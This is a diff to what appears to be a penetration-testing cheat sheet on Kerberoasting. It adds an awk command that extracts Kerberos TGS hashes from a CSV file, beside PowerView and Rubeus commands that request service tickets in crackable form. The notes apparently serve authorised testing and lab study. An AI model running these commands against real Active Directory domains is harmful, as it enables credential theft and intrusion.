@@ -424,6 +424,8 @@ Get-DomainUser * -spn | select samaccountname
 Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
 # Extracting all tickets(accounts) to csv file
 Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+# Parse hashes on linux
+awk -F',' '$5 ~ /^\$krb5tgs\$23\$/ {gsub(/"/,"",$5); print $5}' ilfreight_tgs.csv > tgs_hashes.txt
 
 Rubeus
 .\Rubeus.exe kerberoast /stats # check kerberoastable users
